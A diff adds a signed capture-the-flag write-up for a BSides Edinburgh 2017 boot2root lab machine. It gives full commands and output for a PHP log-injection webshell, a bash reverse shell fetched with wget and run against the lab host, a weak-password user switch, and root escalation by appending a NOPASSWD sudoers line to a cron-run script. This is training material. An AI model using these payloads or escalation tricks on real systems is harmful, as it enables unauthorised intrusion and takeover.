@@ -1,0 +1,242 @@
+-----BEGIN PGP SIGNED MESSAGE-----
+Hash: SHA512
+
+# $Id: 2017_bsides-edinburgh.txt,v 1.0 2017/04/16 20:10:08 dhn Exp $
+
+Writeup BSides Edinburgh 2017 [1]
+
+0x0) found the ports
+
+[dhn]::[~/dev/write_up/boot2root] export ip=192.168.178.83
+[dhn]::[~/dev/write_up/boot2root] nmap -A -T4 -p- $ip
+
+Starting Nmap 7.25BETA2 ( https://nmap.org    ) at 2017-04-17 03:39 EDT
+Nmap scan report for ctf.fritz.box (192.168.178.83)
+Host is up (0.00064s latency).
+Not shown: 65534 closed ports
+PORT   STATE SERVICE VERSION
+80/tcp open  http    Apache httpd 2.4.10 ((Debian))
+| http-robots.txt: 1 disallowed entry 
+|_/
+|_http-server-header: Apache/2.4.10 (Debian)
+|_http-title: Pentest Ltd Hacking Challenge
+MAC Address: 00:0C:29:DF:0F:2F (VMware)
+Device type: general purpose
+Running: Linux 3.X|4.X
+OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
+OS details: Linux 3.2 - 4.4
+Network Distance: 1 hop
+
+TRACEROUTE
+HOP RTT     ADDRESS
+1   0.64 ms ctf.fritz.box (192.168.178.83)
+
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 11.21 seconds
+
+0x1) use gobuster to find hidden directories and files
+
+[dhn]::[~/dev/write_up/boot2root] gobuster -u http://$ip -w /usr/share/dirb/wordlists/common.txt
+
+Gobuster v1.2                OJ Reeves (@TheColonial)
+=====================================================
+[+] Mode         : dir
+[+] Url/Domain   : http://192.168.178.83/
+[+] Threads      : 10
+[+] Wordlist     : /usr/share/dirb/wordlists/common.txt
+[+] Status codes : 200,204,301,302,307
+=====================================================
+/.git/HEAD (Status: 200)
+/index.php (Status: 200)
+/manager (Status: 301)
+/robots.txt (Status: 200)
+/uploads (Status: 301)
+/test.php (Status: 200)
+=====================================================
+
+0x2) open firefox and go to http://$ip
+
+0x3) use the log injection vulnerability in http://$ip/test.php
+      and trigger the injected code
+
+[dhn]::[~/dev/write_up/boot2root] curl -I -H "User-Agent: <?php \$cc='<?php passthru(\$_POST[\'c\']); ?>'; \$fp=fopen('./uploads/test.php','wb'); fwrite(\$fp,\$cc); fclose(\$fp);?>" http://$ip
+HTTP/1.1 200 OK
+Date: Sun, 16 Apr 2017 21:17:22 GMT
+Server: Apache/2.4.10 (Debian)
+Content-Type: text/html; charset=UTF-8
+[dhn]::[~/dev/write_up/boot2root] curl -I http://$ip/test.php
+HTTP/1.1 200 OK
+Date: Sun, 16 Apr 2017 21:17:24 GMT
+Server: Apache/2.4.10 (Debian)
+Content-Type: text/html; charset=UTF-8
+
+0x4) test the webshell
+
+[dhn]::[~/dev/write_up/boot2root] curl --data "c=id" http://$ip/uploads/test.php
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+[dhn]::[~/dev/write_up/boot2root]
+
+0x5) create a bash reverse shell and get an interactive shell
+
+[dhn]::[~/dev/write_up/boot2root] cat evil.sh
+#!/usr/bin/env bash
+
+bash -i >& /dev/tcp/192.168.178.79/7766 0>&1
+root@0day:~# python -m SimpleHTTPServer 443
+Serving HTTP on 0.0.0.0 port 443 ...
+
+[dhn]::[~/dev/write_up/boot2root] curl --data "c=wget http://192.168.178.111:443/evil.sh -O /tmp/evil.sh; chmod 777 /tmp/evil.sh; /tmp/evil.sh" http://$ip/uploads/test.php
+
+0x6) in a other terminal start a "nc" listener
+
+[dhn]::[~/dev/write_up/boot2root] nc -lvp 7766
+listening on [any] 7766 ...
+connect to [192.168.178.79] from ctf.fritz.box [192.168.178.83] 53292
+bash: cannot set terminal process group (570): Inappropriate ioctl for device
+bash: no job control in this shell
+www-data@ctf:/var/www/html/uploads$ id
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+www-data@ctf:/var/www/html/uploads$
+
+0x7) update "shell"
+
+www-data@ctf:/var/www/html/uploads$ python -c 'import pty;pty.spawn("/bin/bash")'
+www-data@ctf:/var/www/html/uploads$
+
+0x8) change "www-data" user to "ctfuser" by using a weak password
+
+www-data@ctf:/home/ctfuser$ su ctfuser
+su ctfuser
+Password: ctfuser
+
+ctfuser@ctf:~$
+
+0x9) gathering information
+
+ctfuser@ctf:~$ ls -lshrta
+total 28K
+4.0K -rw-r--r-- 1 ctfuser ctfuser  675 Jan 28 03:29 .profile
+4.0K -rw-r--r-- 1 ctfuser ctfuser  220 Jan 28 03:29 .bash_logout
+4.0K -rw-r--r-- 1 ctfuser ctfuser 3.5K Jan 28 03:29 .bashrc
+4.0K drwxr-xr-x 2 ctfuser ctfuser 4.0K Apr  5 17:13 .
+4.0K drwxr-xr-x 3 root    root    4.0K Apr  6 13:29 ..
+4.0K -rwxr-xr-x 1 ctfuser ctfuser  114 Apr 16 22:39 clearlog.sh
+4.0K -rw------- 1 ctfuser ctfuser 1.1K Apr 16 23:29 .bash_history
+ctfuser@ctf:~$ cat clearlog.sh
+#!/bin/sh
+echo '' > /var/www/html/9didkaskdhjdfh44/log.txt
+ctfuser@ctf:/etc$ mail
+Mail version 8.1.2 01/15/2001.  Type ? for help.
+"/var/mail/ctfuser": 974 messages 974 new
+>N  1 root@ctf.example.  Mon Jan 30 17:38   23/813 Cron <root@ctf> /root/scrip
+ N  2 root@ctf.example.  Mon Jan 30 17:41   23/791 Cron <root@ctf> /root/scrip
+ N  3 root@ctf.example.  Mon Jan 30 17:46   23/791 Cron <root@ctf> /root/scrip
+ N  4 root@ctf.example.  Tue Jan 31 03:15   23/805 Cron <root@ctf> /var/local/
+ N  5 root@ctf.example.  Tue Jan 31 03:20   23/805 Cron <root@ctf> /var/local/
+ N  6 root@ctf.example.  Tue Jan 31 03:25   23/805 Cron <root@ctf> /var/local/
+ N  7 root@ctf.example.  Tue Jan 31 03:30   23/805 Cron <root@ctf> /var/local/
+ N  8 root@ctf.example.  Tue Jan 31 03:35   23/805 Cron <root@ctf> /var/local/
+ N  9 root@ctf.example.  Tue Jan 31 03:40   23/805 Cron <root@ctf> /var/local/
+ N 10 root@ctf.example.  Tue Jan 31 03:45   23/805 Cron <root@ctf> /var/local/
+ N 11 root@ctf.example.  Tue Jan 31 03:50   23/805 Cron <root@ctf> /var/local/
+ N 12 root@ctf.example.  Tue Jan 31 03:55   23/805 Cron <root@ctf> /var/local/
+ N 13 root@ctf.example.  Tue Jan 31 04:00   23/805 Cron <root@ctf> /var/local/
+ N 14 root@ctf.example.  Tue Jan 31 04:05   23/805 Cron <root@ctf> /var/local/
+ N 15 root@ctf.example.  Tue Jan 31 04:10   23/805 Cron <root@ctf> /var/local/
+ N 16 root@ctf.example.  Tue Jan 31 04:15   23/805 Cron <root@ctf> /var/local/
+ N 17 root@ctf.example.  Tue Jan 31 04:20   23/805 Cron <root@ctf> /var/local/
+ N 18 root@ctf.example.  Tue Jan 31 04:25   23/805 Cron <root@ctf> /var/local/
+ N 19 root@ctf.example.  Tue Jan 31 04:30   23/805 Cron <root@ctf> /var/local/
+ N 20 root@ctf.example.  Tue Jan 31 04:35   23/805 Cron <root@ctf> /var/local/
+&
+
+Message 1:
+- From root@ctf.example.com Mon Jan 30 17:38:41 2017
+Envelope-to: root@ctf.example.com
+Delivery-date: Mon, 30 Jan 2017 17:38:41 +0000
+From: root@ctf.example.com (Cron Daemon)
+To: root@ctf.example.com
+Subject: Cron <root@ctf> /root/scripts/rangen.sh
+MIME-Version: 1.0
+Content-Type: text/plain; charset=UTF-8
+Content-Transfer-Encoding: 8bit
+X-Cron-Env: <SHELL=/bin/sh>
+X-Cron-Env: <HOME=/root>
+X-Cron-Env: <PATH=/usr/bin:/bin>
+X-Cron-Env: <LOGNAME=root>
+Date: Mon, 30 Jan 2017 17:38:41 +0000
+
+/bin/sh: 1: /root/scripts/rangen.sh: Permission denied
+
+&
+ctfuser@ctf:~$
+
+0xa) privilege escalation via sudo
+
+ctfuser@ctf:~$ echo 'echo "ctfuser ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers' >> clearlog.sh
+ctfuser@ctf:~$ cat clearlog.sh
+#!/bin/sh
+echo '' > /var/www/html/9didkaskdhjdfh44/log.txt
+echo "ctfuser ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers
+ctfuser@ctf:~$
+
+# wait 5 minutes
+
+ctfuser@ctf:~$ sudo -l
+Matching Defaults entries for ctfuser on ctf:
+  env_reset, mail_badpass,
+  secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
+
+User ctfuser may run the following commands on ctf:
+  (ALL) NOPASSWD: ALL
+ctfuser@ctf:~$ sudo su
+root@ctf:/home/ctfuser# id
+uid=0(root) gid=0(root) groups=0(root)
+root@ctf:~#
+
+0xb) get the flag
+
+root@ctf:/home/ctfuser# cd
+root@ctf:~# ls
+flag-gen  flag.txt  public_key.pem
+root@ctf:~# cat flag.txt
+Please run the flag-gen binary in the /root/ folder to generate your unique flag. Well Done!
+root@ctf:~# file ./flag-gen
+./flag-gen: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=566a35a6315c24c5da970289dbd3543a9d7a89e4, not stripped
+root@ctf:~# ./flag-gen
+Please supply your name as an argument.
+root@ctf:~# ./flag-gen dhn
+YwPwnc1i9xMxXTuN+PvHtz2KEXAmDiUF4CtmPr1/6+iYTijqwS6ZQuqc8Zi+XMdq2YNM/ezufCwz
+vqqVHYV5NzdrYCgAjgEQL+u49i5muG3UbiCGPb4Qvus0rXVisOdnrP9bI3FEUpNoySw0Ll5h3m51
+s3T/s52vOgMmxHuB03ObCHxrYx6jlAEjZ86hwKlwZF4FaQo10c7pvgLaRRI4pGcBLCI0XlZZWXqu
+jGJiynOM+Vuf6vN32qFUf4YD38xdU3H1KXEIEhNT8iRqvTkEddUL5UViaH37NB6PPrZY9PP5mIYO
+CEhVoumV7qorWeuvXAYZAcRARWxEMbr1WAAGBg==
+root@ctf:~#
+
+0xc) flag
+
+	YwPwnc1i9xMxXTuN+PvHtz2KEXAmDiUF4CtmPr1/6+iYTijqwS6ZQuqc8Zi+XMdq2YNM/ezufCwz
+	vqqVHYV5NzdrYCgAjgEQL+u49i5muG3UbiCGPb4Qvus0rXVisOdnrP9bI3FEUpNoySw0Ll5h3m51
+	s3T/s52vOgMmxHuB03ObCHxrYx6jlAEjZ86hwKlwZF4FaQo10c7pvgLaRRI4pGcBLCI0XlZZWXqu
+	jGJiynOM+Vuf6vN32qFUf4YD38xdU3H1KXEIEhNT8iRqvTkEddUL5UViaH37NB6PPrZY9PP5mIYO
+	CEhVoumV7qorWeuvXAYZAcRARWxEMbr1WAAGBg==
+
+[1] https://maze.pentest-challenge.co.uk/
+
+-----BEGIN PGP SIGNATURE-----
+Version: GnuPG v1
+
+iQIcBAEBCgAGBQJY/GK1AAoJEKjdmUcmQRI8fr4P/2Fo9HxCe5xAjcDgus7tlsmt
+Hv+aTr4pl7e7zOQi8ZR8qTsabvzx1GdP8fPtnbusQLmyj1NVP4gRejxw57lAPWN1
+lAPAXE6/QPJMNfybxJtXAL7fCUGHFJhAlohL2LF3EU/xtu15hiN8snGgr5dqYY39
+puHjSmJlOrRP5BOpGBtHJFGfPrQsgbHzdoTS7jKwOaNOywAOGE6eI5NCeI9b9TVg
+ToUQWkN7MsBzEOcOZw/Jd2Nlrfphzmc+BiQuejWFLhQnt1zzZ0ucpVs32iK033/T
+1NsbtCkGr18OEk4j1MUmLmpzmY9YSB1IkFmVfNw97JnBxzj6smH+PGHriA1OCRvA
+LuUL301mlbrJp0hmpO2Lur7lUF9L7578igq8dMuJBZxsjcsIi1+MwNnqFztePEfp
+M4l63Wa6JuKYtR1clXlRyxGShH993wuC8pjn0/8MzWQZ5ViUDzel8y/ip1gNM4Kx
+66hEY5Kch7AVYMrbZBruSozTsx/Jgqhxv1lkWP/DlRqZ6qnFQ0pEF9xXsPvICtKz
+UQYH/LsxpHCIPbbqK7vTQyjJY3TFjuJCExXaEUaEYqekkDNMfuI7yWrSzbvA+q8K
+QmdDhv5DgQwxVKPgdVLijuxHNM/VSGnBb4TZpWCd6lPQoYPoqgxtTDLx2gMM31xm
+bN8BIDxTY7qZQ9m16Mpo
+=1fxs
+-----END PGP SIGNATURE-----
